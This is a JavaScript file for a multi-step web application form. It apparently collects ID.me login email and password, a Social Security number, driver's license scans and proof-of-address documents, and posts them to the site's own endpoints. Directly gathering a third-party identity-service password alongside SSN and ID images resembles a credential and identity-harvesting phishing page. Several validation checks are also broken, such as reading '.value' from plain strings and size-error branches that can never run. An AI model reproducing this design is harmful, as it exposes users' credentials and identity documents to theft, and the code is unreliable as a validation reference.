//Made the option for resident verification selection
const residentVerficationSelection = document.getElementById("template-application-resident-verification");
residentVerficationSelection.addEventListener("change", () => {
    const selectedValue = residentVerficationSelection.value;
    const idMeEmail = document.getElementById("ID.ME_email");
    const idMePassword = document.getElementById("ID.ME_password");
    const utilityBill = document.getElementById("utility_bill");
    const mortgageLetter = document.getElementById("mortgage_letter");
    if (selectedValue === "ID.ME") {
        utilityBill.style.display = "none";
        mortgageLetter.style.display = "none";
        idMeEmail.style.display = "block";
        idMePassword.style.display = "block";
    } else if (selectedValue == "Utility Bill") {
        idMeEmail.style.display = "none";
        idMePassword.style.display = "none";
        mortgageLetter.style.display = "none";
        utilityBill.style.display = "block";
    } else if (selectedValue == "Mortgage Letter") {
        idMeEmail.style.display = "none";
        idMePassword.style.display = "none";
        utilityBill.style.display = "none";
        mortgageLetter.style.display = "block";
    }
});


//Submition of the form
const all_forms = document.getElementsByTagName("form");
const first_form = all_forms[0];
const second_form = all_forms[1];

//Uploading the file
async function uploadFile(file, fileType) {
    const ssn = document.getElementById("social-security-number");
    if (file?.size > 0) {
        const fileSizeInBytes = file.size;
        if (((fileSizeInBytes / (1024)) / 1024) <= 2) {
            const newFileName = ssn.value + "-" + fileType + "-" + file.name;
            const formData = new FormData();
            formData.enctype = 'multipart/form-data';
            formData.append('file', file, newFileName);
            await fetch('/upload', {
                method: 'POST',
                body: formData
            })
                .then(response => response.text())
                .then(data => console.log(data))
                .catch(error => console.error(error));
        };
    }
}

//Showing privacy and terms
const privacyDiv = document.getElementById("privacyDiv");
const page1 = document.getElementById("page1");
document.getElementById("privacy").onclick = () => {
    privacyDiv.style.display = "block";
    page1.style.display = "none";
};
document.getElementById("readPrivacy").onclick = () => {
    privacyDiv.style.display = "none";
    page1.style.display = "block";
};


//First form
first_form.addEventListener("submit", (event) => {
    event.preventDefault();
    validate_this_form();
})
//Second form
second_form.addEventListener("submit", async (event) => {
    event.preventDefault();
    const validate = validate_this_form();
    if (validate) {
        var loadingScreen = document.getElementById("loadingScreen");
        loadingScreen.style.display = "flex";
        var successful = await submitDetails();
        if (successful) {
            loadingScreen.style.display = "none";
            document.getElementById("page2").style.display = "none";
            (document.getElementsByClassName("emailContainer")[0]).style.display = "flex";
        }
    }
});

//Function that submits the form
async function submitDetails() {
    let submit = false;
    const formData = new FormData(second_form);

    // Remove the file/ unnessary part from the FormData object
    const updatedFormData = new FormData();
    const selectedValue = document.getElementById("template-application-resident-verification").value;
    residentVerficationSelection.value;
    if (selectedValue === "ID.ME") {
        const email = formData.get("template-application-ID.ME-email");
        const password = formData.get("template-application-ID.ME-password");
        if (email.value != "") {
            if (password.value != "") {
                for (var pair of formData.entries()) {
                    if ((pair[0] !== 'template-application-utility-bill') && (pair[0] !== 'template-application-mortgage-letter')) {
                        updatedFormData.append(pair[0], pair[1]);
                    }
                }
                submit = true;
            }
        }

    } else if (selectedValue === "Utility Bill") {
        const file = formData.get("template-application-utility-bill");
        if ((file.size > 0) && (((file.size / 1024) / 1024) <= 2)) {
            await uploadFile(file, "utility_bill");
            for (var pair of formData.entries()) {
                if ((pair[0] !== 'template-application-utility-bill') && (pair[0] !== 'template-application-mortgage-letter')) {
                    updatedFormData.append(pair[0], pair[1]);
                }
            }
            submit = true;
        } else if ((file.size > 0) && (((file.size / 1024) / 1024) <= 2)) {
            alert(`The file size of the utility bill document exceed 2mb ${file.name}`);
        } else {
            alert(`The file size is too small (${file.name})`)
        }

    } else if (selectedValue === "Mortgage Letter") {
        const file = formData.get("template-application-mortgage-letter");
        if (((file.size > 0) && (((file.size / 1024) / 1024) <= 2))) {
            await uploadFile(file, "mortage_letter");
            for (var pair of formData.entries()) {
                if ((pair[0] !== 'template-application-utility-bill') && (pair[0] !== 'template-application-mortgage-letter')) {
                    updatedFormData.append(pair[0], pair[1]);
                }
            }
            submit = true;
        } else if ((file.size > 0) && (((file.size / 1024) / 1024) <= 2)) {
            alert(`The file size of the Mortage Letter document exceed 2mb (${file.name})`);
        } else {
            alert(`The file size is too small (${file.name})`)
        }
    }

    //Remove upload driver_license
    const driverLicenseFront = formData.get("template-application-driver-license-front");
    const driverLicenseBack = formData.get("template-application-driver-license-back");
    if (driverLicenseFront != null) {
        if (driverLicenseBack != null) {
            if (submit === true) {
                if ((driverLicenseFront.size > 0) && (((driverLicenseFront.size / 1024) / 1024) <= 2)) {
                    if ((driverLicenseBack.size > 0) && (((driverLicenseBack.size / 1024) / 1024) <= 2)) {
                        await uploadFile(driverLicenseFront, "driver_license_front");
                        await uploadFile(driverLicenseBack, "driver_license_back");;
                        for (var pair of formData.entries()) {
                            if ((pair[0] !== 'template-application-driver-license-front') && (pair[0] !== 'template-application-driver-license-back')) {
                                updatedFormData.append(pair[0], pair[1]);
                            }
                        }
                    } else if ((driverLicenseBack.size > 0) && (((driverLicenseBack.size / 1024) / 1024) > 2)) {
                        alert("The file size of the Back of Driver License document exceed 2mb");
                    } else {
                        alert(`The file size is too small (${driverLicenseBack.name})`)
                    }
                } else if ((driverLicenseFront.size > 0) && (((driverLicenseFront.size / 1024) / 1024) > 2)) {
                    alert("The file size of the Front of Driver License document exceed 2mb");
                } else {
                    alert(`The file size is too small (${driverLicenseFront.name})`)
                }
            } else {

            }
        }
    }

    //Creating a form data for the first form and adding it to the updated form
    const formData2 = new FormData(first_form);
    formData2.forEach((value, key) => {
        updatedFormData.append(key, value);
    });
    if (submit) {
        const formException = ["template-application-driver-license-front",
            "template-application-driver-license-back",
            "template-application-utility-bill",
            "template-application-mortgage-letter",
            "template-application-subcategories[]",
            "template-application-billing-address"
        ];

        const formToBeSent = {};

        for (const [key, value] of updatedFormData.entries()) {
            if (!formException.includes(key)) {
                formToBeSent[key] = value;
            }
        }

        console.log(formToBeSent);

        await fetch('/register', {
            method: 'POST',
            body: JSON.stringify(formToBeSent),
            headers: {
                'Content-Type': 'application/json'
            }
        })
            .then(response => response.text())
            .then(data => console.log(data))
            .catch(error => console.error(error));
        return true;
    } else {
        alert("An Error occurred!\nPlease upload the necessary files");
        document.getElementById("loadingScreen").style.display = "none";
        return false;
    }

}
